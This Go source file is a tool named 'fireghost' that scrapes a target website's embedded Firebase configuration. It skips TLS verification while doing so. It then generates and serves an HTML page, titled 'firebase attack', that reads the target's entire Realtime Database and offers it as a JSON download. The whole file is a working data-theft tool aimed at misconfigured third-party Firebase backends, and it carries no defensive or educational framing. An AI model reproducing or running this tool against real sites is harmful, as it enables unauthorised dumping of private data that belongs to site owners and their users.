package main

import (
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"text/template"
	"time"
)

type fireghost struct {
	err           error
	printToStdout bool
	serveHTTP     bool
	target        string
	body          []byte
	result        string
	port          int
}

func main() {
	f := new(fireghost)
	f.parseFlags().
		fetchTarget().
		hasFirebase().
		grabConfig().
		printConfig().
		saveFile().
		serveFile()
	if f.err != nil {
		fmt.Println(f.err)
	}
}

// parseFlags parses flags.
// and decides what to do
func (f *fireghost) parseFlags() *fireghost {
	if f.err != nil {
		return f
	}
	// define flags
	flag.IntVar(&f.port, "p", 1339, "port to listen.")
	flag.StringVar(&f.target, "t", "", "target host.")
	flag.BoolVar(&f.printToStdout, "w", true, "Print result to stdout")
	flag.BoolVar(&f.serveHTTP, "s", true, "Serve the generated page.")
	// parse and return
	flag.Parse()
	return f
}

// fetchTarget fetches the target
func (f *fireghost) fetchTarget() *fireghost {
	if f.err != nil {
		return f
	}
	// validate target
	if f.target == "" {
		f.err = errors.New("Target can't be empty!")
		return f
	}
	// ignore https cryoto errors
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// custom http client
	client := http.Client{
		Timeout:   time.Minute,
		Transport: tr,
	}
	// Get the page
	var resp *http.Response
	resp, f.err = client.Get(f.target)
	if f.err != nil {
		return f
	}
	// read the response
	f.body, f.err = ioutil.ReadAll(resp.Body)
	if f.err != nil {
		return f
	}
	return f
}

// hasFirebase checks if the target uses firebase
func (f *fireghost) hasFirebase() *fireghost {
	if f.err != nil {
		return f
	}
	// regex to check firebase plugin
	r, err := regexp.Compile(
		`<script src="https:\/\/www\.gstatic\.com\/firebasejs\/.*?\/firebase\.js"><\/script>`,
	)
	if err != nil {
		f.err = err
		return f
	}
	if r.Match(f.body) {
		return f
	}
	f.err = errors.New("Target doesn't have firebase plugin!")
	return f
}

// grabConfig grabs the configs
func (f *fireghost) grabConfig() *fireghost {
	if f.err != nil {
		return f
	}
	// extract firebase config
	body := string(f.body)
	s := strings.Index(
		body,
		"// Initialize Firebase",
	)
	e := strings.LastIndex(
		body,
		"firebase.initializeApp",
	)
	if s < 0 || e < 0 {
		f.err = errors.New("Target uses firebase, but fireghost couldn't grab the config")
		return f
	}
	f.result = fmt.Sprintf("%s%s",
		string(body[s:e]),
		"firebase.initializeApp(config);",
	)
	return f
}

// printConfig saves and prints the config
func (f *fireghost) printConfig() *fireghost {
	if f.err != nil {
		return f
	}
	if f.printToStdout {
		fmt.Println(f.result)
	}
	return f
}

// saveFile saves the html file
func (f *fireghost) saveFile() *fireghost {
	if f.err != nil {
		return f
	}
	file, err := os.Create(url.PathEscape(f.target) + ".html")
	if err != nil {
		f.err = err
		return f
	}
	f.generateHTML(file)
	return f
}

// serveFile serves the html page
func (f *fireghost) serveFile() *fireghost {
	if f.err != nil {
		return f
	}
	if !f.serveHTTP {
		return f
	}
	fmt.Printf("Serving on localhost:%d\n", f.port)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		f.generateHTML(w)
		if f.err != nil {
			fmt.Fprintln(w, f.err)
		}
	})
	f.err = http.ListenAndServe(fmt.Sprintf(":%d", f.port), nil)
	return f
}

// generateHTML generates html page
func (f *fireghost) generateHTML(w io.Writer) *fireghost {
	if f.err != nil {
		return f
	}
	type Template struct {
		Host   string
		Config string
	}
	var tmpl = Template{
		Host:   f.target,
		Config: f.result,
	}
	page := `
	<html>
	<head>
	<title>{{.Host}} || firebase attack</title>
	<script src="//cdn.jsdelivr.net/npm/eruda" onload="eruda.init()"></script>
	<meta name="viewport" content="initial-scale=1">
<script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-auth.js"></script>
<script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-database.js"></script>
	</head>
	<body><a href="#" id="st">Connecting...</p><body>
	<script>
	{{.Config}}
	</script>
	<script>
	function download(text, name, type) {
  var a = document.getElementById("st");
  var file = new Blob([text], {type: type});
  a.href = URL.createObjectURL(file);
  a.download = name;
}
	var total = [];
	var query = firebase.database().ref().orderByKey();
query.once("value")
  .then(function(snapshot) {
document.getElementById("st").innerHTML="Getting Data...";
var n = 0;
    snapshot.forEach(function(childSnapshot) {
    total.push(childSnapshot);
	n=n+1;
      return false;
  });
document.getElementById("st").innerHTML= "Click me to dump the database"
document.getElementById("st").onclick = function(){
download(JSON.stringify(total), document.title+'.json', 'application/json')
};
})
.catch(function(err){console.log(err)});
	</script>
	`
	t, err := template.New("todos").Parse(page)
	if err != nil {
		f.err = err
		return f
	}
	f.err = t.Execute(w, tmpl)
	if f.err != nil {
		return f
	}
	return f
}
